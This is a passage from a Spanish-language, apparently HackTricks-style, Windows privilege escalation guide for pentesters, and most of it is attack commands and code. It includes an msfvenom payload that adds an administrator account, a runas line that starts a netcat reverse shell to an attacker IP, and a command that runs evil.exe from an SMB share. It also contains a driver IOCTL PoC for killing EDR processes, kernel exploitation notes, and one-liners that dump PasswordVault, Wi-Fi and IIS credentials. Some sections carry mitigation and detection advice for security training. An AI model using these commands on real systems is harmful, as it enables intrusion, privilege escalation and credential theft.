### Permisos AppendData/AddSubdirectory del registro de servicios

Si tienes este permiso sobre un registro, significa que **puedes crear subregistros a partir de este**. En el caso de los servicios de Windows, esto es **suficiente para ejecutar código arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada ruta que termine antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_, Windows intentará ejecutar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Enumera todas las rutas de servicios sin comillas, excluyendo las que pertenecen a servicios integrados de Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Acciones de recuperación

Windows permite a los usuarios especificar acciones que se llevarán a cabo si un servicio falla. Esta función se puede configurar para que apunte a un binario. Si este binario se puede reemplazar, podría ser posible realizar una escalada de privilegios. Puedes encontrar más detalles en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permisos de los binarios** (quizá puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permisos de escritura

Comprueba si puedes modificar algún archivo de configuración para leer algún archivo especial o si puedes modificar algún binario que vaya a ser ejecutado por una cuenta de Administrator (schedtasks).

Una forma de encontrar permisos débiles en carpetas/archivos del sistema es ejecutar:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistencia/ejecución mediante carga automática de plugins de Notepad++

Notepad++ carga automáticamente cualquier DLL de plugin ubicada en sus subcarpetas `plugins`. Si existe una instalación portable o una copia con permisos de escritura, colocar un plugin malicioso permite la ejecución automática de código dentro de `notepad++.exe` en cada inicio (incluyendo desde `DllMain` y las callbacks de los plugins).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Ejecución al inicio

**Comprueba si puedes sobrescribir algún registro o binario que vaya a ser ejecutado por otro usuario.**\
**Lee** la **siguiente página** para obtener más información sobre **ubicaciones interesantes de autorun para escalar privilegios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Busca posibles drivers de terceros **extraños/vulnerables**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un driver expone una primitive arbitraria de lectura/escritura del kernel (común en handlers IOCTL mal diseñados), puedes escalar privilegios robando directamente un token de SYSTEM desde la memoria del kernel.<sup>[[13]](#references)</sup> Consulta la técnica paso a paso aquí:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race condition en los que la llamada vulnerable abre una ruta del Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes de longitud máxima o cadenas de directorios profundas) puede ampliar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAFs de cancel-safe queue, disclosures de paged-pool y pivots de I/O ring

Algunas cadenas de LPE del kernel de Windows pueden construirse a partir de dos bugs débiles de forma individual: una **race condition de lifetime de cancel-safe queue** que libera una request/CBD mientras el queue lock aún está retenido, y un disclosure de **lock-release-before-copy** que filtra una asignación liberada del paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notas de auditoría y exploitation:

- **Free-under-lock + cancel afterwards**: busca una ruta exitosa que realice **Acquire -> CompleteRequest/free -> Release**, mientras que la ruta de cancelación realiza **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Si la ruta exitosa alcanza `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` antes de liberar el lock de CBDQ/CSQ, un thread bloqueado en `NtCancelIoFileEx -> IopCsqCancelRoutine` puede reanudarse más tarde y pasar un `PFLT_CALLBACK_DATA` liberado de vuelta al remove callback del driver.
- **Reclama el objeto de queue liberado** con una asignación de paged-pool controlada por el atacante y del mismo tamaño. Las `NPFS` Data Queue Entries son útiles porque el payload y el tamaño son controlables, y posteriormente puedes sondearlas con operaciones de lectura/peek de pipe. Si el objeto liberado incorpora list links, sobrescríbelos con una **lista cíclica de fake request nodes en memoria de user** para que el driver procese repetidamente estructuras de request definidas por el atacante en lugar de terminar en el list head original.
- **Mejora un write predecible**: si la fake request redirige un context pointer anidado utilizado por los bookkeeping writes (timestamps / QPC / campos adyacentes a refcount), puedes obtener un **kernel write controlado por dirección, pero no por valor**. En ese caso, apunta al campo de **length/size** de un objeto de pool rociado en lugar de a un code/data pointer final, y luego enumera el spray hasta que el objeto corrupto produzca una **lectura out-of-bounds del paged-pool**.
- **Patrón de disclosure raceable**: cualquier syscall que haga `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` es un candidato sólido. La fiabilidad mejora cuando el atacante puede ampliar el buffer copiado (por ejemplo, añadiendo muchas list/resource entries que incrementen el tamaño de asignación final de un serializer), porque la copia más larga amplía la ventana de reemplazo sin necesariamente provocar el crash de la máquina.
- **Pointer-rich refill targets**: los arrays de registered-buffer de Windows **I/O ring** son excelentes targets de disclosure porque su tamaño de paged-pool está controlado por el atacante (`8 * regBufferCnt`) y cada elemento es un kernel pointer a un `_IOP_MC_BUFFER_ENTRY`. Filtra uno de estos arrays, recupera el `IORING_OBJECT` circundante y luego corrompe **`RegBuffers`** y **`RegBuffersCount`** para que las operaciones posteriores del I/O ring consuman entries falsificados por el atacante y proporcionen lectura/escritura arbitraria del kernel. Si el único write disponible te proporciona un byte estable (por ejemplo, de `KUSER_SHARED_DATA+0x14`), usa **overlapping unaligned writes** para construir un user pointer de bytes repetidos como `0x0101010101010101`, asígnalo con `VirtualAlloc` y coloca allí el array de registered-buffer falsificado.<sup>[[30]](#references)</sup>

Indicadores útiles de debugging:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Una vez que obtengas lectura/escritura arbitraria del kernel mediante el I/O ring corrupto, roba un token de SYSTEM usando el workflow estándar posterior a la obtención de la primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivas de corrupción de memoria de registry hives

Las vulnerabilidades modernas de hives permiten preparar layouts deterministas, abusar de descendientes escribibles de HKLM/HKU y convertir la corrupción de metadatos en desbordamientos del paged pool del kernel sin un driver personalizado. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusión de tipos en modo directo de `RtlQueryRegistryValues` mediante paths controlados por el atacante

Algunos drivers aceptan un path del registry desde userland, validan únicamente que sea una cadena UTF-16 válida y después llaman a `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` sobre un escalar de la stack, como `int readValue`. Si falta `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se interpreta según el tipo **real** del registry, no según el tipo esperado por el developer.

Esto crea dos primitives útiles:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: un path absoluto `\Registry\...` controlado por el usuario permite al driver consultar keys elegidas por el atacante, filtrar su existencia mediante códigos de retorno/logs y, en ocasiones, leer valores a los que el caller no podría acceder directamente.
- **Corrupción de memoria del kernel**: un destino escalar como `&readValue` se interpreta con un tipo incorrecto como `REG_QWORD`, `UNICODE_STRING` o un buffer binario de tamaño variable, según el tipo del valor del registry.

Notas prácticas de explotación:

- **Mitigación de Windows 8+**: si la consulta alcanza un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT`, pero sin `RTL_QUERY_REGISTRY_TYPECHECK`, los callers del kernel provocan un crash con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para mantener la exploitability, busca keys escribibles por el atacante dentro de trusted system hives en lugar de preparar los valores bajo `HKCU`.
- **Staging en trusted hives**: usa NtObjectManager para enumerar descendientes escribibles de `\Registry\Machine` y vuelve a ejecutar el scan con un token **low-integrity** duplicado para encontrar keys accesibles desde contextos sandboxed:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: una escritura directa de 8 bytes en un `int` de 4 bytes corrompe datos adyacentes de la pila y puede sobrescribir parcialmente un callback o un puntero a función cercano.
- **`REG_SZ` / `REG_EXPAND_SZ`**: el modo directo espera que `EntryContext` apunte a un `UNICODE_STRING`. Si el código carga primero un `REG_DWORD` controlado por el atacante en un escalar de la pila y después reutiliza ese mismo búfer para una lectura de cadena, el atacante controla `Length`/`MaximumLength` e influye parcialmente en el puntero `Buffer`, produciendo una escritura del kernel parcialmente controlada.
- **`REG_BINARY`**: para datos binarios grandes, el modo directo trata el primer `LONG` en `EntryContext` como el tamaño de un búfer con signo. Si una lectura previa de `REG_DWORD` deja un valor negativo controlado por el atacante en el escalar reutilizado, la siguiente consulta de `REG_BINARY` copia bytes del atacante directamente sobre las posiciones adyacentes de la pila, lo que suele ser el camino más sencillo para sobrescribir por completo un puntero de callback.

Patrón sólido de hunting: **lecturas heterogéneas del registro en la misma variable de la pila sin reinicializarla**. Busca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, punteros `EntryContext` reutilizados y rutas de código en las que la primera lectura del registro controle si se realiza una segunda lectura.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Algunos drivers de terceros firmados crean su objeto de dispositivo con un SDDL sólido mediante IoCreateDeviceSecure, pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin este flag, la DACL segura no se aplica cuando el dispositivo se abre mediante una ruta que contiene un componente adicional, lo que permite que cualquier usuario sin privilegios obtenga un handle usando una ruta de namespace como:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una vez que un usuario puede abrir el dispositivo, los IOCTLs privilegiados expuestos por el driver pueden abusarse para LPE y tampering. Capacidades observadas en entornos reales:
- Devolver handles con acceso total a procesos arbitrarios (robo de tokens / shell de SYSTEM mediante DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura raw sin restricciones en el disco (tampering offline, técnicas de persistencia durante el arranque).
- Terminar procesos arbitrarios, incluidos Protected Process/Light (PP/PPL), lo que permite eliminar AV/EDR desde user land mediante el kernel.

Patrón mínimo de PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigaciones para desarrolladores
- Establece siempre FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo destinados a estar restringidos por una DACL.
- Valida el contexto del caller para las operaciones privilegiadas. Añade comprobaciones PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringe los IOCTL (máscaras de acceso, METHOD_*, validación de entradas) y considera modelos brokered en lugar de privilegios directos del kernel.

Ideas de detección para defenders
- Monitoriza las aperturas desde user-mode de nombres de dispositivo sospechosos (p. ej., \\ .\\amsdk*) y secuencias específicas de IOCTL indicativas de abuso.
- Aplica la vulnerable driver blocklist de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias allow/deny lists.


## PATH DLL Hijacking

Si tienes **permisos de escritura dentro de una carpeta presente en PATH**, podrías ser capaz de secuestrar una DLL cargada por un proceso y **escalar privilegios**.<sup>[[2]](#references)</sup>

Comprueba los permisos de todas las carpetas dentro de PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para obtener más información sobre cómo abusar de esta comprobación:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking de la resolución de módulos de Node.js / Electron mediante `C:\node_modules`

Esta es una variante de **uncontrolled search path** en **Windows** que afecta a aplicaciones de **Node.js** y **Electron** cuando realizan un import bare como `require("foo")` y falta el módulo esperado.<sup>[[20]](#references)</sup>

Node resuelve los paquetes recorriendo el árbol de directorios y comprobando las carpetas `node_modules` de cada directorio padre. En Windows, ese recorrido puede llegar a la raíz de la unidad, por lo que una aplicación iniciada desde `C:\Users\Administrator\project\app.js` podría terminar buscando:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **usuario con pocos privilegios** puede crear `C:\node_modules`, puede colocar un `foo.js` malicioso (o una carpeta de paquete) y esperar a que un **proceso de Node/Electron con mayores privilegios** intente resolver la dependencia faltante. El payload se ejecuta en el contexto de seguridad del proceso víctima, por lo que esto se convierte en **LPE** cuando el objetivo se ejecuta como administrador, desde una tarea programada o un wrapper de servicio con privilegios elevados, o desde una aplicación de escritorio privilegiada iniciada automáticamente.

Esto es especialmente habitual cuando:

- una dependencia se declara en `optionalDependencies`<sup>[[22]](#references)</sup>
- una librería de terceros envuelve `require("foo")` en `try/catch` y continúa tras el fallo
- un paquete se eliminó de las compilaciones de producción, se omitió durante el empaquetado o no se pudo instalar
- el `require()` vulnerable se encuentra en una parte profunda del árbol de dependencias en lugar de estar en el código principal de la aplicación

### Búsqueda de objetivos vulnerables

Usa **Procmon** para demostrar la ruta de resolución:<sup>[[23]](#references)</sup>

- Filtra por `Process Name` = ejecutable objetivo (`node.exe`, el EXE de la aplicación Electron o el proceso wrapper)
- Filtra por `Path` `contains` `node_modules`
- Concéntrate en `NAME NOT FOUND` y en la apertura final correcta en `C:\node_modules`

Patrones útiles para la revisión de código en archivos `.asar` desempaquetados o en los fuentes de la aplicación:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Explotación

1. Identifica el **nombre del paquete faltante** mediante Procmon o revisando el código fuente.
2. Crea el directorio de búsqueda raíz si aún no existe:
```powershell
mkdir C:\node_modules
```
3. Coloca un módulo con el nombre exacto esperado:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Activa la aplicación víctima. Si la aplicación intenta ejecutar `require("foo")` y el módulo legítimo no está presente, Node puede cargar `C:\node_modules\foo.js`.

Entre los ejemplos reales de módulos opcionales ausentes que siguen este patrón se incluyen `bluebird` y `utf-8-validate`, pero la **technique** es la parte reutilizable: busca cualquier **missing bare import** que un proceso privilegiado de Windows basado en Node/Electron resuelva.

### Ideas de detección y hardening

- Genera una alerta cuando un usuario cree `C:\node_modules` o escriba nuevos archivos `.js`/packages allí.
- Busca procesos con alta integridad que lean desde `C:\node_modules\*`.
- Incluye todas las runtime dependencies en producción y audita el uso de `optionalDependencies`.
- Revisa el código de terceros en busca de patrones silenciosos como `try { require("...") } catch {}`.
- Desactiva las comprobaciones opcionales cuando la library lo permita (por ejemplo, algunas implementaciones de `ws` pueden evitar la comprobación heredada de `utf-8-validate` mediante `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Recursos compartidos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Comprueba si hay otros equipos conocidos codificados de forma fija en el archivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de red y DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Puertos abiertos

Comprueba si hay **servicios restringidos** desde el exterior
```bash
netstat -ano #Opened ports?
```
### Tabla de enrutamiento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabla ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reglas del Firewall

[**Consulta esta página para ver los comandos relacionados con el Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para la enumeración de red aquí](../basic-cmd-for-pentesters.md#network)

### Subsistema de Windows para Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
El binario `bash.exe` también puede encontrarse en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes un usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, se te preguntará mediante la GUI si `nc` debe permitirse en el firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar fácilmente bash como root, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciales de Windows

### Credenciales de Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Administrador de credenciales / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault almacena las credenciales de los usuarios para servidores, sitios web y otros programas que **Windows** puede utilizar para **iniciar sesión automáticamente para los usuarios**. Al principio, esto puede sonar como si los usuarios pudieran almacenar las credenciales de sitios como Facebook, Twitter o Gmail y hacer que los navegadores iniciaran sesión automáticamente, pero no funciona así.

Windows Vault almacena credenciales con las que Windows puede iniciar sesión automáticamente para los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede utilizar este Credential Manager** & Windows Vault y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña todo el tiempo.

A menos que las aplicaciones interactúen con Credential Manager, no creo que sea posible que utilicen las credenciales de un recurso determinado. Por lo tanto, si tu aplicación quiere utilizar el vault, debería **comunicarse de alguna manera con el administrador de credenciales y solicitar las credenciales de ese recurso** al vault de almacenamiento predeterminado.

Usa `cmdkey` para enumerar las credenciales almacenadas en la máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Luego puedes usar `runas` con las opciones `/savecred` para utilizar las credenciales guardadas. El siguiente ejemplo ejecuta un binario remoto mediante un recurso compartido SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Uso de `runas` con un conjunto de credenciales proporcionadas.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Ten en cuenta que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o el [módulo de Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Las aplicaciones UWP modernas de Windows, Microsoft Edge y los servicios modernos del sistema almacenan tokens de autenticación y contraseñas en texto plano dentro de `PasswordVault` de Universal Windows Platform (UWP) (también expuesto como `Web Credentials` en `vaultcmd`). Este espacio de almacenamiento está aislado por sesión y puede descifrarse de forma nativa sin privilegios administrativos ni derechos de `SeDebugPrivilege`.

Ejecuta este comando de PowerShell dentro de la sesión activa del usuario para volcar y descifrar al instante todos los nombres de usuario y contraseñas en texto plano almacenados:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

La **Data Protection API (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado principalmente dentro del sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado utiliza un secreto de usuario o del sistema para contribuir significativamente a la entropía.

**DPAPI permite cifrar claves mediante una clave simétrica derivada de los secretos de inicio de sesión del usuario**. En escenarios que implican el cifrado del sistema, utiliza los secretos de autenticación de dominio del sistema.

Las claves RSA de usuario cifradas mediante DPAPI se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Identificador de seguridad](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, ubicada junto a la master key que protege las claves privadas del usuario en el mismo archivo**, normalmente consta de 64 bytes de datos aleatorios. (Es importante tener en cuenta que el acceso a este directorio está restringido, lo que impide enumerar su contenido mediante el comando `dir` en CMD, aunque sí puede enumerarse mediante PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes usar el **módulo mimikatz** `dpapi::masterkey` con los argumentos adecuados (`/pvk` o `/rpc`) para descifrarla.

Los **archivos de credenciales protegidos por la contraseña maestra** suelen encontrarse en:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puedes usar el **mimikatz module** `dpapi::cred` con el `/masterkey` apropiado para descifrar.\
Puedes **extraer muchas **masterkeys** de DPAPI** de la **memoria** con el módulo `sekurlsa::dpapi` (si eres root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciales de PowerShell

Las **credenciales de PowerShell** se utilizan a menudo para tareas de **scripting** y automatización, como una forma de almacenar cómodamente credenciales cifradas. Las credenciales están protegidas mediante **DPAPI**, lo que normalmente significa que solo pueden ser descifradas por el mismo usuario en el mismo equipo en el que fueron creadas.

Para **descifrar** unas credenciales de PS desde el archivo que las contiene, puedes hacer lo siguiente:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos ejecutados recientemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Administrador de credenciales de Escritorio remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa el módulo `dpapi::rdg` de **Mimikatz** con `/masterkey` adecuado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchas masterkeys de DPAPI** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz

### Sticky Notes

A menudo, las personas usan la aplicación Sticky Notes en estaciones de trabajo Windows para **guardar contraseñas** y otra información, sin darse cuenta de que es un archivo de base de datos. Este archivo se encuentra en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` y siempre vale la pena buscarlo y examinarlo.

### AppCmd.exe

**Ten en cuenta que, para recuperar contraseñas de AppCmd.exe, debes ser Administrador y ejecutarlo con un nivel de integridad Alto.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, es posible que se hayan configurado algunas **credenciales** y puedan **recuperarse**.

Este código se extrajo de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
